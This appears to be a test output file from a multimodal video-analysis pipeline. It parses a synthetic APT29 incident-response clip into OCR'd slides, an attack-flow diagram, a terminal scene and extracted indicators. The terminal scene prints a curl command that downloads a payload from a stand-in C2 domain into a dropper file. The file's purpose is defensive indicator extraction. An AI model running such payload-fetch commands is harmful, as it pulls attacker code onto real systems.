@@ -1,0 +1,159 @@
+{
+  "metadata": {
+    "file_name": "sample_apt29_investigation.mp4",
+    "file_path": "/home/subham/Documents/sih-2026/pipelines/video_pipeline/tests/samples/sample_apt29_investigation.mp4",
+    "file_size_bytes": 1147316,
+    "sha256_checksum": "e15a95a9ab546d1ed425e56da2dc9bfaf15d18f15778c1693b3d9ea75a1edaa2",
+    "duration_seconds": 16.0,
+    "fps": 10.0,
+    "resolution": "1280x720",
+    "total_frames": 160,
+    "has_audio": true,
+    "processed_at": "2026-09-11T15:58:54.362149+00:00"
+  },
+  "scenes": [
+    {
+      "scene_id": 1,
+      "start_seconds": 0.0,
+      "end_seconds": 5.2,
+      "timestamp_display": "00:00 - 00:05",
+      "keyframe": {
+        "frame_index": 32,
+        "timestamp_seconds": 3.2,
+        "image_path": "/home/subham/Documents/sih-2026/pipelines/video_pipeline/tests/test_outputs/keyframes/keyframe_001_3s.png",
+        "perceptual_hash": "bf3bc0e623c8c8cc",
+        "visual_type": "SLIDE"
+      },
+      "visual": {
+        "visual_type": "SLIDE",
+        "raw_ocr_text": "CYBER THREAT ADVISORY: APT29 COZY BEAR\n- Threat Actor: Midnight Blizzard / APT29\n- Primary CVE: CVE-2023-38831 (CVSS 8.8)\n- Secondary CVE: CVE-2024-21413 (CVSS 9.8)\n- Impacted Infrastructure: 500+ government workstations\n- Initial Vector: Spearphishing with weaponized payload",
+        "structured_content": "#### 📑 Slide: CYBER THREAT ADVISORY: APT29 COZY BEAR\n- Threat Actor: Midnight Blizzard / APT29\n- Primary CVE: CVE-2023-38831 (CVSS 8.8)\n- Secondary CVE: CVE-2024-21413 (CVSS 9.8)\n- Impacted Infrastructure: 500+ government workstations\n- Initial Vector: Spearphishing with weaponized payload",
+        "mermaid_diagram": null,
+        "code_snippet": null,
+        "extracted_iocs": [
+          "CVE-2023-38831",
+          "CVE-2024-21413"
+        ],
+        "visual_narrative": "Presentation slide covering: CYBER THREAT ADVISORY: APT29 COZY BEAR"
+      },
+      "spoken_transcript": "Front left. Front center.",
+      "scene_iocs": [
+        "CVE-2023-38831",
+        "CVE-2024-21413"
+      ]
+    },
+    {
+      "scene_id": 2,
+      "start_seconds": 5.2,
+      "end_seconds": 9.2,
+      "timestamp_display": "00:05 - 00:09",
+      "keyframe": {
+        "frame_index": 72,
+        "timestamp_seconds": 7.2,
+        "image_path": "/home/subham/Documents/sih-2026/pipelines/video_pipeline/tests/test_outputs/keyframes/keyframe_002_7s.png",
+        "perceptual_hash": "e84c4d4d68684f5f",
+        "visual_type": "DIAGRAM"
+      },
+      "visual": {
+        "visual_type": "DIAGRAM",
+        "raw_ocr_text": "Architecture Flowchart: APT29 Ingress Topology\nAttacker Node Perimeter DMZ Target Workstation Domain Controller\nC2 Server Firewall Gateway Mail Client Database",
+        "structured_content": "#### 📊 Architecture / Attack Flow Diagram\n\n```mermaid\nflowchart LR\n    %% Actors / Assets\n    A[Attacker] --> C2[C2 Server]\n    C2 -->|Phishing Email| MC[Mail Client]\n    MC -->|Malicious Attachment| WC[Target Workstation]\n    \n    %% Network perimeter\n    C2 --> GW[Gateway]\n    GW --> FW[Firewall]\n    FW --> DMZ[Perimeter DMZ]\n    \n    %% Lateral movement & data access\n    DMZ --> WC\n    WC -->|Pass‑the‑Hash| DC[Domain Controller]\n    DC -->|Query/Exfil| DB[Database]\n    \n    %% Optional return path for exfiltration\n    DB -->|Data exfil| FW\n    FW -->|Outbound| GW\n    GW -->|C2 Channel| C2\n```\n\n**Narrative:** **  \nAPT29’s operator hosts a C2 server that delivers a phishing email to a mail client, which executes a malicious attachment on a target workstation. The compromised workstation moves laterally through the perimeter DM",
+        "mermaid_diagram": "```mermaid\nflowchart LR\n    %% Actors / Assets\n    A[Attacker] --> C2[C2 Server]\n    C2 -->|Phishing Email| MC[Mail Client]\n    MC -->|Malicious Attachment| WC[Target Workstation]\n    \n    %% Network perimeter\n    C2 --> GW[Gateway]\n    GW --> FW[Firewall]\n    FW --> DMZ[Perimeter DMZ]\n    \n    %% Lateral movement & data access\n    DMZ --> WC\n    WC -->|Pass‑the‑Hash| DC[Domain Controller]\n    DC -->|Query/Exfil| DB[Database]\n    \n    %% Optional return path for exfiltration\n    DB -->|Data exfil| FW\n    FW -->|Outbound| GW\n    GW -->|C2 Channel| C2\n```",
+        "code_snippet": null,
+        "extracted_iocs": [],
+        "visual_narrative": "**  \nAPT29’s operator hosts a C2 server that delivers a phishing email to a mail client, which executes a malicious attachment on a target workstation. The compromised workstation moves laterally through the perimeter DM"
+      },
+      "spoken_transcript": "Front center. Front right.",
+      "scene_iocs": []
+    },
+    {
+      "scene_id": 3,
+      "start_seconds": 9.2,
+      "end_seconds": 13.2,
+      "timestamp_display": "00:09 - 00:13",
+      "keyframe": {
+        "frame_index": 112,
+        "timestamp_seconds": 11.2,
+        "image_path": "/home/subham/Documents/sih-2026/pipelines/video_pipeline/tests/test_outputs/keyframes/keyframe_003_11s.png",
+        "perceptual_hash": "c0d43f629335666b",
+        "visual_type": "TERMINAL"
+      },
+      "visual": {
+        "visual_type": "TERMINAL",
+        "raw_ocr_text": "root@secops-node0l:~# curl -s https://apt29-c2.net/payload.bin -o /var/tmp/dropper.bin\nC2 Beacon Detected -> External C2 Server: 203.0.113.195\nMalicious Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\nroot@secops-node0l:~# iptables -A INPUT -s 203.0.113.195 -j DROP\nActive perimeter containment rule deployed.",
+        "structured_content": "#### 💻 Terminal Session / Shell Output\n\n```bash\nroot@secops-node0l:~# curl -s https://apt29-c2.net/payload.bin -o /var/tmp/dropper.bin\nC2 Beacon Detected -> External C2 Server: 203.0.113.195\nMalicious Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\nroot@secops-node0l:~# iptables -A INPUT -s 203.0.113.195 -j DROP\nActive perimeter containment rule deployed.\n```\n*Referenced Paths:* `/apt29-c2.net/payload.bin, /var/tmp/dropper.bin`",
+        "mermaid_diagram": null,
+        "code_snippet": "root@secops-node0l:~# curl -s https://apt29-c2.net/payload.bin -o /var/tmp/dropper.bin\nC2 Beacon Detected -> External C2 Server: 203.0.113.195\nMalicious Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\nroot@secops-node0l:~# iptables -A INPUT -s 203.0.113.195 -j DROP\nActive perimeter containment rule deployed.",
+        "extracted_iocs": [
+          "203.0.113.195",
+          "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+          "apt29-c2.net"
+        ],
+        "visual_narrative": "Active command-line console session displaying terminal execution logs."
+      },
+      "spoken_transcript": "Front right. Rear center.",
+      "scene_iocs": [
+        "203.0.113.195",
+        "apt29-c2.net",
+        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+      ]
+    },
+    {
+      "scene_id": 4,
+      "start_seconds": 13.2,
+      "end_seconds": 16.0,
+      "timestamp_display": "00:13 - 00:16",
+      "keyframe": {
+        "frame_index": 152,
+        "timestamp_seconds": 15.2,
+        "image_path": "/home/subham/Documents/sih-2026/pipelines/video_pipeline/tests/test_outputs/keyframes/keyframe_004_15s.png",
+        "perceptual_hash": "b66c49494e494f37",
+        "visual_type": "SLIDE"
+      },
+      "visual": {
+        "visual_type": "SLIDE",
+        "raw_ocr_text": "INCIDENT CONTAINMENT & REMEDIATION PLAN\n- Priority 1: Patch vulnerability CVE-2023-38831 across endpoints\n- Priority 2: Ingress filter deployed for C2 host 203.0.113.195\n- Priority 3: Revoke Kerberos golden tickets on domain controller\n- Priority 4: Isolate compromised internal node 192.168.1.105",
+        "structured_content": "#### 📑 Slide: INCIDENT CONTAINMENT & REMEDIATION PLAN\n- Priority 1: Patch vulnerability CVE-2023-38831 across endpoints\n- Priority 2: Ingress filter deployed for C2 host 203.0.113.195\n- Priority 3: Revoke Kerberos golden tickets on domain controller\n- Priority 4: Isolate compromised internal node 192.168.1.105",
+        "mermaid_diagram": null,
+        "code_snippet": null,
+        "extracted_iocs": [
+          "CVE-2023-38831",
+          "192.168.1.105",
+          "203.0.113.195"
+        ],
+        "visual_narrative": "Presentation slide covering: INCIDENT CONTAINMENT & REMEDIATION PLAN"
+      },
+      "spoken_transcript": "Rear center.",
+      "scene_iocs": [
+        "192.168.1.105",
+        "203.0.113.195",
+        "CVE-2023-38831"
+      ]
+    }
+  ],
+  "full_audio_transcript": " Front left. Front center. Front right. Rear center.",
+  "iocs": {
+    "cves": [
+      "CVE-2023-38831",
+      "CVE-2024-21413"
+    ],
+    "ipv4_addresses": [
+      "192.168.1.105",
+      "203.0.113.195"
+    ],
+    "ipv6_addresses": [],
+    "sha256_hashes": [
+      "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    ],
+    "md5_hashes": [],
+    "domains": [
+      "apt29-c2.net"
+    ],
+    "urls": [
+      "https://apt29-c2.net/payload.bin"
+    ],
+    "mitre_attack_ids": [],
+    "total_iocs_found": 7
+  },
+  "clean_markdown": "# 🎥 Multimodal Video Intelligence: sample_apt29_investigation.mp4\n\n*Duration: 16.0s | Resolution: 1280x720 @ 10.0 FPS | SHA256: `e15a95a9ab546d1e...`*\n\n## 1. Technical Telemetry & Extracted Indicators\n- **Total Visual Scenes:** 4\n- **Extracted CVEs:** CVE-2023-38831, CVE-2024-21413\n- **IPv4 Addresses:** 192.168.1.105, 203.0.113.195\n- **SHA256 Signatures:** e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n- **Malicious Domains / URLs:** apt29-c2.net, https://apt29-c2.net/payload.bin\n\n## 2. Temporally Aligned Multimodal Scene Timeline\n\n### ⏱️ Scene 1 [00:00 - 00:05] - Visual: `SLIDE`\n**Spoken Narration:** \"Front left. Front center.\"\n\n#### 📑 Slide: CYBER THREAT ADVISORY: APT29 COZY BEAR\n- Threat Actor: Midnight Blizzard / APT29\n- Primary CVE: CVE-2023-38831 (CVSS 8.8)\n- Secondary CVE: CVE-2024-21413 (CVSS 9.8)\n- Impacted Infrastructure: 500+ government workstations\n- Initial Vector: Spearphishing with weaponized payload\n\n📌 **Scene Indicators:** `CVE-2023-38831, CVE-2024-21413`\n\n---\n### ⏱️ Scene 2 [00:05 - 00:09] - Visual: `DIAGRAM`\n**Spoken Narration:** \"Front center. Front right.\"\n\n#### 📊 Architecture / Attack Flow Diagram\n\n```mermaid\nflowchart LR\n    %% Actors / Assets\n    A[Attacker] --> C2[C2 Server]\n    C2 -->|Phishing Email| MC[Mail Client]\n    MC -->|Malicious Attachment| WC[Target Workstation]\n    \n    %% Network perimeter\n    C2 --> GW[Gateway]\n    GW --> FW[Firewall]\n    FW --> DMZ[Perimeter DMZ]\n    \n    %% Lateral movement & data access\n    DMZ --> WC\n    WC -->|Pass‑the‑Hash| DC[Domain Controller]\n    DC -->|Query/Exfil| DB[Database]\n    \n    %% Optional return path for exfiltration\n    DB -->|Data exfil| FW\n    FW -->|Outbound| GW\n    GW -->|C2 Channel| C2\n```\n\n**Narrative:** **  \nAPT29’s operator hosts a C2 server that delivers a phishing email to a mail client, which executes a malicious attachment on a target workstation. The compromised workstation moves laterally through the perimeter DM\n\n---\n### ⏱️ Scene 3 [00:09 - 00:13] - Visual: `TERMINAL`\n**Spoken Narration:** \"Front right. Rear center.\"\n\n#### 💻 Terminal Session / Shell Output\n\n```bash\nroot@secops-node0l:~# curl -s https://apt29-c2.net/payload.bin -o /var/tmp/dropper.bin\nC2 Beacon Detected -> External C2 Server: 203.0.113.195\nMalicious Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\nroot@secops-node0l:~# iptables -A INPUT -s 203.0.113.195 -j DROP\nActive perimeter containment rule deployed.\n```\n*Referenced Paths:* `/apt29-c2.net/payload.bin, /var/tmp/dropper.bin`\n\n📌 **Scene Indicators:** `203.0.113.195, apt29-c2.net, e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`\n\n---\n### ⏱️ Scene 4 [00:13 - 00:16] - Visual: `SLIDE`\n**Spoken Narration:** \"Rear center.\"\n\n#### 📑 Slide: INCIDENT CONTAINMENT & REMEDIATION PLAN\n- Priority 1: Patch vulnerability CVE-2023-38831 across endpoints\n- Priority 2: Ingress filter deployed for C2 host 203.0.113.195\n- Priority 3: Revoke Kerberos golden tickets on domain controller\n- Priority 4: Isolate compromised internal node 192.168.1.105\n\n📌 **Scene Indicators:** `192.168.1.105, 203.0.113.195, CVE-2023-38831`\n\n---\n\n## 3. Full Continuous Audio Transcript\n\n>  Front left. Front center. Front right. Rear center.\n"
+}
